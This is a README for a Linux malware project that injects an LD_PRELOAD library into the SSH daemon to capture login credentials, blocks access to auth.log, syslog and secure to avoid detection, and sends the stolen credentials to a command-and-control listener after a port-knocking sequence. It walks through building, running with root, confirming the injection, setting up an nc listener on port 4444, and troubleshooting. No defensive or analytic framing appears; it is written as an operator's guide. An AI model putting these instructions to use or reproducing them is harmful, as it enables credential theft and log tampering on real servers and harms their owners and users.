Malware LD_PRELOAD - Instructions
---------------------------------

This malware:
- Injects LD_PRELOAD to intercept SSH credentials.
- Kills and restarts the SSH daemon with LD_PRELOAD.
- Prevents access to critical log files (auth.log, syslog, secure).
- Executes a port knocking sequence before connecting to the C2 server.
- Sends stolen credentials to the C2 after port knocking is successful.

--------------------------------------------------------
Compilation
--------------------------------------------------------
Run the following command in the project directory:

    make

This will generate:
- `malware.so` (shared library used with LD_PRELOAD)
- `malware` (executable that kills and restarts SSH)

--------------------------------------------------------
Execution
--------------------------------------------------------
Run the malware with root privileges:

    sudo ./malware

This command will:
- Kill any running SSH daemon.
- Restart SSH with `LD_PRELOAD` injected.
- Hide logs to prevent detection.
- Execute the port knocking sequence before connecting to the C2 server.

--------------------------------------------------------
Verify if SSH is Running with LD_PRELOAD
--------------------------------------------------------
To check if the SSH daemon has restarted with the malware injected:

    ps aux | grep sshd

If everything is working correctly, you should see `/usr/sbin/sshd` running with `LD_PRELOAD=/path/to/malware.so`.

--------------------------------------------------------
Testing Port Knocking
--------------------------------------------------------
Before the malware can contact the C2, it must complete the port knocking sequence.

Run the following commands on the victim machine:

    netcat -z -v 127.0.0.1 1111
    netcat -z -v 127.0.0.1 11
    netcat -z -v 127.0.0.1 2222
    netcat -z -v 127.0.0.1 222
    netcat -z -v 127.0.0.1 22

After completing this sequence, the malware will be able to connect to the C2.

--------------------------------------------------------
Verify Connection to the C2
--------------------------------------------------------
On the C2 machine, start the listener:

    sudo nc -lvp 4444

Once the port knocking sequence is completed, the malware will send stolen credentials to the C2.
If credentials appear on the C2, everything is working correctly.

--------------------------------------------------------
Stopping the Malware
--------------------------------------------------------
To stop the malware and restore SSH:

    sudo pkill -f malware
    sudo pkill -f sshd
    sudo systemctl restart ssh

--------------------------------------------------------
Troubleshooting
--------------------------------------------------------

Check if `LD_PRELOAD` is active:

    cat /proc/$(pgrep -f sshd)/maps | grep malware.so

Check if the port knocking sequence is working:

    sudo netstat -tulnp | grep LISTEN

Check if `malware.so` was successfully generated:

    ls -lah malware.so

Check if the C2 server is listening:

    sudo netstat -tulnp | grep 4444

If everything is set up correctly, the malware should now be operational.
